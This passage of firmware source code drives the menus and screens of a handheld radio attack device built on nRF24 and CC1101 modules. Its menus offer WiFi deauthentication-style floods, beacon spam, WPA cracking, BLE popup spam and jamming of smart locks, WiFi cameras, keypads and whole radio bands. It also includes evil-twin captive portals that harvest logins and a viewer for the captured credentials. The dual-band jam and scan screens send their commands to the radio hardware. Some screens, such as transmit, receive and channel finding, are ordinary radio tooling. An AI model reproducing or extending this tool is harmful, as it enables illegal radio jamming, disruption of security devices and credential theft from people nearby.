    gDualJamMs = millis();
    ggClickOk();
  }
  ggOled.clearDisplay(); ggHeader("DUAL JAM");
  if (gDualJamUp) {
    uint32_t el = (millis() - gDualJamMs) / 1000;
    ggOled.setCursor(4, 16); ggOled.printf("CC: %.2f MHz", gDualCcFreq);
    ggOled.setCursor(4, 25); ggOled.print(F("nRF: CH 0-125"));
    ggOled.setTextSize(2);
    ggOled.setCursor(10, 36); ggOled.print(F("JAMMING"));
    ggOled.setTextSize(1);
    ggOled.setCursor(4, 54); ggOled.printf("%lus  BACK=stop", (unsigned long)el);
  } else {
    ggOled.setCursor(4, 16); ggOled.printf("CC: %.2f MHz", gDualCcFreq);
    ggOled.setCursor(4, 25); ggOled.print(F("nRF: CH 0-125 full"));
    ggOled.setCursor(4, 36); ggOled.print(F("UP/DN=CC freq"));
    ggOled.setCursor(4, 48); ggOled.print(F("SEL=start BACK=exit"));
  }
  ggOled.display();
}

// ---------------------------------------------------------------- DUAL-BAND SCAN
static bool gDualScanUp = false;

static inline void ggScreenDualScan() {
  if (!kbIsLinked(ghBridge)) {
    if (gEv.back) {
      if (gDualScanUp) { ggNrfStopAll(); gDualScanUp = false; }
      ggBack(); return;
    }
    ggOled.clearDisplay(); ggHeader("DUAL SCAN");
    ggOled.setCursor(4, 24); ggOled.print(F("Bridge OFFLINE"));
    ggOled.setCursor(4, 36); ggOled.print(F("Link CC1101 first"));
    ggOled.display(); return;
  }
  if (gEv.back) {
    if (gDualScanUp) {
      ggNrfStopAll();
      KodiBridge msg; KbCcPayload cc = {};
      kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_STOP, cc);
      ghBridgeSend(msg);
      gDualScanUp = false;
    }
    ggBack(); return;
  }
  if (gEv.sel && !gDualScanUp) {
    memset(gNrfScan, 0, sizeof(gNrfScan));
    gCcScanReady = false;
    GhNodeCmd c = {};
    c.type = GH_CMD_SCAN_START;
    c.radio = 0;
    ghSendCmd(c);
    KodiBridge msg; KbCcPayload cc = {};
    cc.freq = gDualCcFreq;
    kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_SCAN, cc);
    ghBridgeSend(msg);
    gDualScanUp = true;
    ggClickFire();
  }
  ggOled.clearDisplay(); ggHeader("DUAL SCAN");
  if (gDualScanUp) {
    // Live nRF bar graph: channels 0-125 mapped to 126 columns
    for (int c = 0; c <= 125; c++) {
      int h = gNrfScan[c];
      if (h > 30) h = 30;
      if (h > 0) ggOled.drawFastVLine(c + 1, 44 - h, h, SSD1306_WHITE);
    }
    ggOled.drawFastHLine(0, 44, 128, SSD1306_WHITE);
    ggOled.setCursor(2, 12); ggOled.print(F("nRF 2400-2525MHz"));
    if (gCcScanReady) {
      ggOled.setCursor(2, 46); ggOled.printf("CC: %.0fMHz %dpt", gDualCcFreq, gCcScanSteps);
    } else {
      ggOled.setCursor(2, 46); ggOled.printf("CC: %.0fMHz ...", gDualCcFreq);
    }
    ggOled.drawFastHLine(0, 54, 128, SSD1306_WHITE);
    ggOled.setCursor(2, 56); ggOled.print(F("SCANNING  BACK=stop"));
  } else {
    ggOled.setCursor(4, 16); ggOled.print(F("nRF: CH 0-125"));
    ggOled.setCursor(4, 25); ggOled.printf("CC:  %.0f MHz", gDualCcFreq);
    ggOled.setCursor(4, 40); ggOled.print(F("UP/DN = CC freq"));
    ggOled.setCursor(4, 52); ggOled.print(F("SEL=scan BACK=exit"));
  }
  if (!gDualScanUp) {
    if (gEv.up)   { gDualCcFreq += 1.0f; if (gDualCcFreq > 928.0f) gDualCcFreq = 928.0f; }
    if (gEv.down) { gDualCcFreq -= 1.0f; if (gDualCcFreq < 300.0f) gDualCcFreq = 300.0f; }
  }
  ggOled.display();
}

// ---------------------------------------------------------------- CATEGORY: WiFi ATK
static inline void ggScreenCatWifi() {
  static const char* const IT[] = {
    "WiFi TX", "Beacon Spam", "WiFi Rickroll", "Auth Flood",
    "WiFi Fuzzer", "Quiet Storm", "BSSID Clone", "Fake AP Farm",
    "WiFi Time Bomb", "WiFi Crack"
  };
  static const char* const HI[] = {
    "Flood a WiFi channel", "Flood fake SSIDs+NAV", "Custom SSID broadcast",
    "Exhaust AP auth table", "Random malformed WiFi", "802.11h silence atk",
    "Spoof exact BSSID", "12 persistent fake AP", "Delayed auto-jam",
    "Capture+crack WPA key"
  };
  ggMove(0, 9);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_WIFI_TX); break;
      case 1: ggGo(GS_SPAM_RUN); break;
      case 2: ggGo(GS_RICK_MENU); break;
      case 3: ggGo(GS_AUTH_PICK); break;
      case 4: ggGo(GS_FUZZ_RUN); break;
      case 5: ggGo(GS_QUIET_PICK); break;
      case 6: ggGo(GS_CLONE_PICK); break;
      case 7: ggGo(GS_FARM_RUN); break;
      case 8: ggGo(GS_TIMEBOMB); break;
      case 9: ggGo(GS_CRACK_PICK); break;
    } return;
  }
  ggMenu("WiFi ATK", IT, 10, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: BLE ATK
static inline void ggScreenCatBle() {
  static const char* const IT[] = {
    "BLE TX", "Apple Spam", "FastPair Spam", "Samsung Spam",
    "SwiftPair Spam", "Name Flood", "All Protocols",
    "Smart Lock Buzz"
  };
  static const char* const HI[] = {
    "BLE advert broadcast", "Apple device popups", "Android pair popups",
    "Samsung Buds popups", "Windows pair popups", "Random BLE names",
    "Cycle all spam types", "Jam BLE smart locks"
  };
  ggMove(0, 7);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_BLE_TX); break;
      case 1: ggBleSpamProto = GG_BSP_APPLE; ggGo(GS_BLESPAM_RUN); break;
      case 2: ggBleSpamProto = GG_BSP_FASTPAIR; ggGo(GS_BLESPAM_RUN); break;
      case 3: ggBleSpamProto = GG_BSP_SAMSUNG; ggGo(GS_BLESPAM_RUN); break;
      case 4: ggBleSpamProto = GG_BSP_SWIFTPAIR; ggGo(GS_BLESPAM_RUN); break;
      case 5: ggBleSpamProto = GG_BSP_NAMES; ggGo(GS_BLESPAM_RUN); break;
      case 6: ggBleSpamProto = GG_BSP_ALL; ggGo(GS_BLESPAM_RUN); break;
      case 7: ggGo(GS_SLOCK_RUN); break;
    } return;
  }
  ggMenu("BLE ATK", IT, 8, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: nRF Radio
static inline void ggScreenCatNrf() {
  static const char* const IT[] = {
    "Transmit", "More Modes", "Keypad Buster", "nRF Jam"
  };
  static const char* const HI[] = {
    "Send data on 2.4GHz", "Beacon, range, listen", "Disrupt 2.4G keypads",
    "Full nRF spectrum jam"
  };
  ggMove(0, 3);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: gNrfCfg = &gNrfA; ggGo(GS_NRF); break;
      case 1: ggGo(GS_MODES); break;
      case 2: ggGo(GS_KPAD_RUN); break;
      case 3: ggGo(GS_NRF_JAM); break;
    } return;
  }
  ggMenu("nRF Radio", IT, 4, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Combo ATK
static inline void ggScreenCatCombo() {
  static const char* const IT[] = {
    "Channel Thief", "Radius Jammer",
    "Chain Attack", "Progressive Jam", "Auto-Target", "Blackout",
    "Dual Band Jam", "Dual Band Scan"
  };
  static const char* const HI[] = {
    "CSA hijack+jam target", "Jam all nearby APs",
    "WiFi>BLE>nRF cycle", "Power ramp jam", "Scan+jam strongest",
    "Full band RF blackout",
    "CC1101+nRF24 jam both", "Scan sub-GHz + 2.4GHz"
  };
  ggMove(0, 7);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_JAM_PICK); break;
      case 1: ggGo(GS_RAD_PICK); break;
      case 2: ggGo(GS_CHAIN_RUN); break;
      case 3: ggGo(GS_PROG_JAM); break;
      case 4: ggGo(GS_AUTO_TARGET); break;
      case 5: ggGo(GS_BLACKOUT); break;
      case 6: ggGo(GS_DUAL_JAM); break;
      case 7: ggGo(GS_DUAL_SCAN); break;
    } return;
  }
  ggMenu("Combo ATK", IT, 8, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Recon
static inline void ggScreenCatRecon() {
  static const char* const IT[] = {
    "Cop/Surv Scan", "Tracker Scan", "Deauth Detect",
    "Probe Harvest", "Network Audit", "MAC Harvest",
    "BLE Prox Alert", "UUID Scanner", "BLE Range",
    "Hidden Scanner", "Signal Meter"
  };
  static const char* const HI[] = {
    "WiFi surveillance", "BLE AirTag/Tile/etc", "Monitor for deauths",
    "Sniff probe requests", "Scan WiFi security", "Collect BLE MACs",
    "Alert device nearby", "Show BLE UUIDs", "BLE signal strength",
    "Find hidden networks", "WiFi RSSI bar graph"
  };
  ggMove(0, 10);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0:  ggGo(GS_COP_SCAN); break;
      case 1:  ggGo(GS_TRACKER_SCAN); break;
      case 2:  ggGo(GS_DEAUTH_DET); break;
      case 3:  ggGo(GS_PROBE_RUN); break;
      case 4:  ggGo(GS_NET_AUDIT); break;
      case 5:  ggGo(GS_MAC_HARVEST); break;
      case 6:  ggGo(GS_PROX_ALERT); break;
      case 7:  ggGo(GS_UUID_SCAN); break;
      case 8:  ggGo(GS_BLE_RANGE); break;
      case 9:  ggGo(GS_HIDDEN_SCAN); break;
      case 10: ggGo(GS_SIGNAL_METER); break;
    } return;
  }
  ggMenu("Recon", IT, 11, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Exploits
static inline void ggScreenCatExploit() {
  static const char* const IT[] = {
    "Evil Twin", "Coffee Portal", "Hotel Portal",
    "Update Portal", "WiFi Geofence", "Camera Jammer"
  };
  static const char* const HI[] = {
    "Clone AP+catch creds", "Coffee shop creds", "Hotel room+name",
    "Fake update prompt", "Alert when SSID near", "Jam WiFi cameras"
  };
  ggMove(0, 5);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggPortalType = GG_PT_DEFAULT; ggGo(GS_EVIL_PICK); break;
      case 1: ggPortalType = GG_PT_COFFEE; ggGo(GS_EVIL_PICK); break;
      case 2: ggPortalType = GG_PT_HOTEL; ggGo(GS_EVIL_PICK); break;
      case 3: ggPortalType = GG_PT_UPDATE; ggGo(GS_EVIL_PICK); break;
      case 4: ggGo(GS_GEOFENCE); break;
      case 5: ggGo(GS_CAMERA_JAM); break;
    } return;
  }
  ggMenu("Exploits", IT, 6, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: Tools
static inline void ggScreenCatTools() {
  static const char* const IT[] = {
    "WiFi Heatmap", "Band Occupancy", "Pkt Rate Graph",
    "Attack Timer", "Saved Creds",
    "CC1101 TX", "CC1101 Jam", "CC1101 Scan", "RFID Read",
    "CC1101 Capture"
  };
  static const char* const HI[] = {
    "Per-channel signal", "nRF spectrum view", "Live packet counter",
    "Countdown auto-jam", "View captured logins",
    "Sub-GHz TX via bridge", "Sub-GHz jam via bridge", "Freq scan via bridge",
    "NFC read via bridge",
    "Record & replay remotes"
  };
  ggMove(0, 9);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: ggGo(GS_HEATMAP); break;
      case 1: ggGo(GS_BAND_OCC); break;
      case 2: ggGo(GS_PKTRATE); break;
      case 3: ggGo(GS_ATK_TIMER); break;
      case 4: ggGo(GS_CRED_VIEW); break;
      case 5: ggGo(GS_CC_TX); break;
      case 6: ggGo(GS_CC_JAM); break;
      case 7: ggGo(GS_CC_SCAN); break;
      case 8: ggGo(GS_CC_RFID); break;
      case 9: ggGo(GS_CC_REC); break;
    } return;
  }
  ggMenu("Tools", IT, 10, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- CATEGORY: System
static inline void ggScreenCatSystem() {
  static const char* const IT[] = { "Saved Setups", "Settings", "Help & Guide" };
  static const char* const HI[] = { "Load/save configs", "Volume & radio mode", "Learn how to use it" };
  ggMove(0, 2);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    switch (gSel) {
      case 0: gNrfCfg = &gNrfA; gSlot = 0; ggGo(GS_NPROF); break;
      case 1: ggGo(GS_SETTINGS); break;
      case 2: ggGo(GS_HELP); break;
    } return;
  }
  ggMenu("System", IT, 3, gSel, gTop, HI[gSel]);
}

// ---------------------------------------------------------------- TRANSMIT config
// One screen holds the whole send: channel, speed, power, the payload, and how
// it's sent - Amount (packets per SEND) and Gap (ms between them). SEND NOW fires
// it. Every hint is kept <=21 chars so it never clips.
enum { N_SEND=0, N_CH, N_RATE, N_POWER, N_KIND, N_DATA, N_LEN, N_AMT, N_GAP, N_PLIB, N_ADDR, N_ACK, N_ADV, N_NAME, N_SAVE, N_CNT };
static const char* ggNrfHint(int f) {
  bool b = (gNrfCfg == &gNrfB);
  switch (f) {
    case N_SEND: return b ? "B sends when A does" : "Fire the payload";
    case N_CH:   return "2.4GHz channel 0-125";
    case N_RATE: return "Speed 250k/1M/2M";
    case N_POWER:return "Output strength";
    case N_KIND: return "HEX/TEXT = you type";
    case N_DATA: return "Edit your payload";
    case N_LEN:  return "How many bytes 1-32";
    case N_AMT:  return "Packets per SEND";
    case N_GAP:  return "ms between packets";
    case N_PLIB: return "Your saved payloads";
    case N_ADDR: return "Must match receiver";
    case N_ACK:  return "Wait for a reply?";
    case N_ADV:  return "Address, CRC, resend";
    case N_NAME: return "Name this setup";
    case N_SAVE: return "Save the whole setup";
  } return "";
}
static inline void ggNrfLabel(int f, char* o, size_t n) {
  GgNrfProfile& p = *gNrfCfg;
  bool autoData = (p.plKind!=GG_PL_HEX && p.plKind!=GG_PL_TEXT);
  switch (f) {
    case N_SEND: snprintf(o,n, (gNrfCfg==&gNrfB) ? "(B sends w/ DUAL-TX)" : "SEND NOW >"); break;
    case N_CH:   snprintf(o,n,"Channel: %u", p.channel); break;
    case N_RATE: snprintf(o,n,"Speed: %s", GG_RATE_NAME[p.rate>2?2:p.rate]); break;
    case N_POWER:snprintf(o,n,"Power: %s", GG_PWR_NAME[p.power>3?3:p.power]); break;
    case N_KIND: snprintf(o,n,"Data type: %s", GG_PL_NAME[p.plKind>6?6:p.plKind]); break;
    // Payload row ALWAYS opens the editor now. For an "auto" type we show (auto)
    // but the ">" tells you it's still openable - typing bytes switches to HEX.
    case N_DATA: autoData? snprintf(o,n,"Payload: (auto) >") : snprintf(o,n,"Payload: %02X.. >",p.payload[0]); break;
    case N_LEN:  snprintf(o,n,"Length: %u", p.plLen); break;
    case N_AMT:  snprintf(o,n,"Amount: %u", p.burstN); break;
    case N_GAP:  snprintf(o,n,"Gap: %u ms", p.burstGapMs); break;
    case N_PLIB: snprintf(o,n,"My payloads >"); break;
    case N_ADDR: snprintf(o,n,"Address: %02X%02X.. >",p.addr[0],p.addr[1]); break;
    case N_ACK:  snprintf(o,n,"Ack: %s", p.autoAck?"ON":"OFF"); break;
    case N_ADV:  snprintf(o,n,"Advanced >"); break;
    case N_NAME: snprintf(o,n,"Name: %s >", p.name); break;
    case N_SAVE: snprintf(o,n,"Save all as preset >"); break;
  }
}
static inline void ggNrfAdjust(int f, int dir) {
  GgNrfProfile& p = *gNrfCfg;
  switch (f) {
    case N_CH: ggStepU8(p.channel, dir, GG_NRF_CH_MIN, GG_NRF_CH_MAX); break;
    case N_RATE: ggCycle(p.rate,3,dir); break;
    case N_POWER: ggCycle(p.power,4,dir); break;
    case N_KIND: ggCycle(p.plKind,GG_PL_COUNT,dir); break;
    case N_LEN: ggStepU8(p.plLen, dir, 1, GG_PAYLOAD_MAX); break;
    case N_AMT: ggStepU16(p.burstN,dir,10,1,2000); break;
    case N_GAP: ggStepU16(p.burstGapMs,dir,5,0,2000); break;
    case N_ACK: p.autoAck = !p.autoAck; break;
  }
}
static inline void ggScreenNrf() {
  if (gEditing) {
    if (gEv.up) ggNrfAdjust(gSel,+1);
    if (gEv.down) ggNrfAdjust(gSel,-1);
    if (gEv.sel || gEv.back) gEditing=false;
  } else {
    ggMove(0, N_CNT-1);
    if (gEv.back) { ggBack(); return; }
    if (gEv.sel) {
      bool editingB = (gNrfCfg == &gNrfB);
      switch (gSel) {
        case N_SEND: if(!editingB){ ggGo(GS_NRF_TX); return; } break;
        case N_DATA:
          // Always let you type a payload. If the data type is an "auto" kind,
          // switch it to HEX so the bytes you enter are the bytes that go out -
          // no more dead "(auto)" row. Length is editable right here too.
          if (gNrfCfg->plKind!=GG_PL_HEX && gNrfCfg->plKind!=GG_PL_TEXT) gNrfCfg->plKind = GG_PL_HEX;
          ggOpenBytes(gNrfCfg->payload, gNrfCfg->plLen, "PAYLOAD",
                      gNrfCfg->plKind==GG_PL_TEXT, &gNrfCfg->plLen, GG_PAYLOAD_MAX);
          return;
        case N_PLIB: gPaySlot=0; ggGo(GS_PAYLIB); return;
        case N_ADDR: ggOpenBytes(gNrfCfg->addr, GG_ADDR_WIDTH, "ADDRESS", false); return;
        case N_NAME: gNrfCfg->name[12]=0; ggOpenBytes((uint8_t*)gNrfCfg->name, 12, "NAME", true); return;
        case N_ADV:  ggGo(GS_ADV); return;
        case N_SAVE: gSlot=0; ggGo(GS_NPROF); return;
        default: gEditing = true; break;
      }
    }
  }
  static char rows[N_CNT][22]; const char* p[N_CNT];
  for (int i=0;i<N_CNT;i++){ ggNrfLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu(gNrfCfg==&gNrfA?"Transmit":"Radio B", p, N_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggNrfHint(gSel));
}

// ---------------------------------------------------------------- ADVANCED
// (Amount + Gap live on the Transmit screen now; Advanced is the deep radio match.)
enum { A_AW=0, A_CRC, A_RETRY, A_CNT };
static const char* ggAdvHint(int f){
  switch(f){ case A_AW:return "Address length 3-5"; case A_CRC:return "Error-check length";
    case A_RETRY:return "Resend tries 0-15"; } return "";
}
static inline void ggAdvLabel(int f, char* o, size_t n){
  GgNrfProfile& p=*gNrfCfg;
  switch(f){
    case A_AW:      snprintf(o,n,"Addr width: %u", p.addrWidth); break;
    case A_CRC:     snprintf(o,n,"CRC: %s", GG_CRC_NAME[p.crc>2?2:p.crc]); break;
    case A_RETRY:   snprintf(o,n,"Retries: %u", p.retries); break;
  }
}
static inline void ggAdvAdjust(int f,int dir){
  GgNrfProfile& p=*gNrfCfg;
  switch(f){
    case A_AW: ggStepU8(p.addrWidth,dir,3,5); break;
    case A_CRC: ggStepU8(p.crc,dir,0,2); break;
    case A_RETRY: ggStepU8(p.retries,dir,0,15); break;
  }
}
static inline void ggScreenAdv(){
  if (gEditing){ if(gEv.up)ggAdvAdjust(gSel,+1); if(gEv.down)ggAdvAdjust(gSel,-1); if(gEv.sel||gEv.back)gEditing=false; }
  else { ggMove(0,A_CNT-1); if(gEv.back){ggBack();return;} if(gEv.sel)gEditing=true; }
  static char rows[A_CNT][22]; const char* p[A_CNT];
  for(int i=0;i<A_CNT;i++){ ggAdvLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu("Advanced", p, A_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggAdvHint(gSel));
}

// ---------------------------------------------------------------- MORE MODES
static const char* const MODE_ITEMS[] = { "Beacon (auto-send)", "Range check", "Find clear channel", "Receive / listen" };
static const char* const MODE_HINTS[] = { "Send on a timer", "Steady tone for range", "See busy channels", "Show packets you get" };
static inline void ggScreenModes(){
  ggMove(0,3);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ ggGo(gSel==0?GS_NRF_BEACON: gSel==1?GS_NRF_CARRIER: gSel==2?GS_NRF_SCAN: GS_NRF_RX); return; }
  ggMenu("More modes", MODE_ITEMS, 4, gSel, gTop, MODE_HINTS[gSel]);
}

// ---------------------------------------------------------------- SEND screen (burst)
static inline void ggScreenNrfTx() {
  if (!gRunInit) {
    gTxCount=0; gAckOk=0; gTxFail=0; gRxCount=0; gBurstLeft=0; ggNrfConfigureForTx(); gRunInit=true;
    if (gAutoFire) { gBurstLeft=(gNrfA.burstN<1)?1:gNrfA.burstN; gBurstNext=0; gAutoFire=false; }  // Load&send fires the burst
  }
  if (gEv.back) { ggStopTx(); ggBack(); return; }
  if (gEv.up)   { ggStepU8(gNrfA.channel,+1,GG_NRF_CH_MIN,GG_NRF_CH_MAX); ggNrfConfigureForTx(); }
  if (gEv.down) { ggStepU8(gNrfA.channel,-1,GG_NRF_CH_MIN,GG_NRF_CH_MAX); ggNrfConfigureForTx(); }
  if (gEv.sel)  { gPhase+=4; gBurstLeft = (gNrfA.burstN<1)?1:gNrfA.burstN; gBurstNext=0; }  // fire a burst
  if (gSelHeld) { static uint32_t l=0; uint32_t now=millis(); if (now-l>=3){ l=now; gPhase++; ggNrfSendOne(); } } // stream while held
  if (gBurstLeft && !gSelHeld) {                       // run the burst, non-blocking
    uint32_t now=millis();
    if ((int32_t)(now-gBurstNext) >= 0){ gPhase++; ggNrfSendOne(); gBurstLeft--; gBurstNext=now+gNrfA.burstGapMs; }
  }
  ggNrfPollPair();
  uint32_t plan = (uint32_t)(gNrfA.burstN?gNrfA.burstN:1) * gNrfA.burstGapMs;   // est duration
  ggOled.clearDisplay(); ggHeader("SEND");
  ggBurstMark(14, 32, (int)gPhase);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u %s", gNrfA.channel, GG_RATE_NAME[gNrfA.rate>2?2:gNrfA.rate]);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(gTxCount));
  ggOled.setTextSize(1); ggOled.setCursor(2,45);
  // gTxCount = packets pushed OUT on air. Idle shows the plan (amount + est time);
  // after firing, the count and ack tally prove it transmitted.
  if (gBurstLeft)                 ggOled.printf("on air  %u left", gBurstLeft);
  else if (gSelHeld)              ggOled.print("on air (stream)");
  else if (gTxCount>0 && gSet.nrfMode==GG_NM_PAIR && gNrfA.autoAck)
                                  ggOled.printf("on air  acked %s", ggFmtCount(gAckOk));
  else if (gTxCount>0)            ggOled.print("on air - sent!");
  else if (plan>=1000)            ggOled.printf("plan %upkt ~%lus",gNrfA.burstN,(unsigned long)((plan+500)/1000));
  else                            ggOled.printf("plan %upkt ~%lums",gNrfA.burstN,(unsigned long)plan);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("SEL=fire  hold=stream");
  ggOled.display();
}
static inline void ggScreenNrfBeacon() {
  if (!gRunInit){ gTxCount=0; gBeaconOn=false; ggNrfConfigureForTx(); if(gNrfA.repeatMs==0)gNrfA.repeatMs=500; gRunInit=true; }
  if (gEv.back){ ggStopTx(); ggBack(); return; }
  if (gEv.sel){ gBeaconOn=!gBeaconOn; gBeaconLast=millis(); }
  if (gEv.up){ int v=gNrfA.repeatMs+50; if(v>5000)v=5000; gNrfA.repeatMs=v; }
  if (gEv.down){ int v=(int)gNrfA.repeatMs-50; if(v<50)v=50; gNrfA.repeatMs=v; }
  uint32_t now=millis(), nextIn=0;
  if (gBeaconOn){ if(now-gBeaconLast>=gNrfA.repeatMs){ gBeaconLast=now; gPhase++; ggNrfSendOne(); } nextIn=gNrfA.repeatMs-(now-gBeaconLast); }
  ggNrfPollPair();
  ggOled.clearDisplay(); ggHeader("Beacon");
  ggBurstMark(14,32,(int)gPhase);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("every %ums",gNrfA.repeatMs);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(gTxCount)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); if(gBeaconOn) ggOled.printf("ON  next %lums",(unsigned long)nextIn); else ggOled.print("paused - SEL to go");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("SEL=go  UP/DN=rate");
  ggOled.display();
}
static inline void ggScreenNrfCarrier() {
  if (gEv.back){ if(gCarrierOn){ ggNrfCarrierOff(0); gCarrierOn=false; } ggBack(); return; }
  if (!gCarrierOn && gEv.up)   ggStepU8(gNrfA.channel,+1,GG_NRF_CH_MIN,GG_NRF_CH_MAX);
  if (!gCarrierOn && gEv.down)  ggStepU8(gNrfA.channel,-1,GG_NRF_CH_MIN,GG_NRF_CH_MAX);
  if (gEv.sel){ gCarrierOn=!gCarrierOn; if(gCarrierOn){ ggNrfCarrierOn(0,gNrfA.channel);} else { ggNrfCarrierOff(0);} }
  ggOled.clearDisplay(); ggHeader("Range check");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,16); ggOled.printf("Ch %u   Pwr %s",gNrfA.channel,GG_PWR_NAME[gNrfA.power>3?3:gNrfA.power]);
  ggOled.setTextSize(2); ggOled.setCursor(2,28); ggOled.print(gCarrierOn?"ON AIR":"OFF"); ggOled.setTextSize(1);
  ggOled.setCursor(2,46); ggOled.print("steady carrier tone");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(gCarrierOn?"SEL=stop":"SEL=start  UP/DN ch");
  ggOled.display();
}
static inline void ggScreenNrfScan() {
  if (!gRunInit){ memset(gNrfScan,0,sizeof(gNrfScan)); gScanPause=false; if(ggNrfToolP()) ggNrfScanStart(); gRunInit=true; }
  if (gEv.back){ ggNrfStopAll(); ggBack(); return; }
  if (gEv.sel) { gScanPause=!gScanPause; if(!gScanPause && ggNrfToolP()) ggNrfScanStart(); else if(gScanPause) ggNrfStopAll(); }
  if (gEv.selLong){ int best=0,bv=999; for(int c=0;c<=GG_NRF_CH_MAX;c++) if(gNrfScan[c]<bv){bv=gNrfScan[c];best=c;} gNrfA.channel=best; }
  int busy=0,bv=-1,clr=0,cv=999;
  for(int c=0;c<=GG_NRF_CH_MAX;c++){ if(gNrfScan[c]>bv){bv=gNrfScan[c];busy=c;} if(gNrfScan[c]<cv){cv=gNrfScan[c];clr=c;} }
  ggOled.clearDisplay(); ggHeader("Find channel");
  for(int c=0;c<=GG_NRF_CH_MAX;c++){ int h=gNrfScan[c]; if(h>24)h=24; if(h>0) ggOled.drawFastVLine(c+1,44-h,h,SSD1306_WHITE); }
  ggOled.drawFastHLine(0,44,128,SSD1306_WHITE);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setCursor(2,46); ggOled.printf("busy%d   clear%d",busy,clr);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(gScanPause?"SEL=run   hold=grab":"SEL=pause  hold=grab");
  ggOled.display();
}
static inline void ggScreenNrfRx() {
  if (!gRunInit){ gRxCount=0; gRxLen=0; GgNrfProfile rp=gNrfA; rp.autoAck=0; if(ggNrfPresentB){ ggNrfConfigRx(1,rp); } else if(ggNrfPresentA){ ggNrfConfigRx(0,rp); } gRunInit=true; }
  if (gEv.back){ ggNrfStopAll(); ggBack(); return; }
  if (gEv.sel){ gRxCount=0; gRxLen=0; }             // SELECT = reset the counter
  int rxRadio = ggNrfPresentB?1:0;
  if (ggNrfPresentA||ggNrfPresentB){ uint8_t l=0,pp=0; if(ggNrfRxPoll(rxRadio,gRxLast,&l,&pp)){ gRxLen=l; gRxPipe=pp; gRxCount++; } }
  ggOled.clearDisplay(); ggHeader("Receive");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("CH%u  got %s",gNrfA.channel,ggFmtCount(gRxCount));
  ggOled.setCursor(2,27); ggOled.printf("pipe %u  len %u",gRxPipe,gRxLen);
  ggOled.setCursor(2,36); for(int i=0;i<gRxLen&&i<8;i++) ggOled.printf("%02X",gRxLast[i]);
  ggOled.setCursor(2,45); ggOled.print("\""); for(int i=0;i<gRxLen&&i<16;i++){ char c=gRxLast[i]; ggOled.write((c>=32&&c<127)?c:'.'); } ggOled.print("\"");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56); ggOled.print("SEL=reset  BACK=exit");
  ggOled.display();
}

// ---------------------------------------------------------------- PRESETS
static inline void ggScreenNProf() {
  if (gEv.up) ggStepU8(gSlot,-1,0,GG_PROFILE_SLOTS-1);
  if (gEv.down) ggStepU8(gSlot,+1,0,GG_PROFILE_SLOTS-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ gSel=0; ggGo(GS_PROFACT); return; }
  static char rows[GG_PROFILE_SLOTS][22]; const char* p[GG_PROFILE_SLOTS];
  for(int i=0;i<GG_PROFILE_SLOTS;i++){ if(ggNrfSlotUsed(i)){ GgNrfProfile t; ggNrfProfLoad(i,t); snprintf(rows[i],22,"%d %-8s CH%u",i,t.name,t.channel);} else snprintf(rows[i],22,"%d  (empty)",i); p[i]=rows[i]; }
  int top=gSlot<4?0:gSlot-3; ggMenu("Saved setups", p, GG_PROFILE_SLOTS, gSlot, top, "SEL=open  BACK");
}
static const char* const PA_USED[]={"Load this","Overwrite","Delete"}; static const char* const PA_EMPTY[]={"Save here"};
static inline void ggScreenProfAct() {
  bool used = ggNrfSlotUsed(gSlot); int n = used?3:1;
  ggMove(0, n-1);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel) {
    if (!used){ ggNrfProfSave(gSlot,*gNrfCfg); ggBack(); return; }
    if (gSel==0){ GgNrfProfile t; if(ggNrfProfLoad(gSlot,t)){ if(t.plLen<1||t.plLen>GG_PAYLOAD_MAX)t.plLen=8; *gNrfCfg=t; } ggBack(); return; }
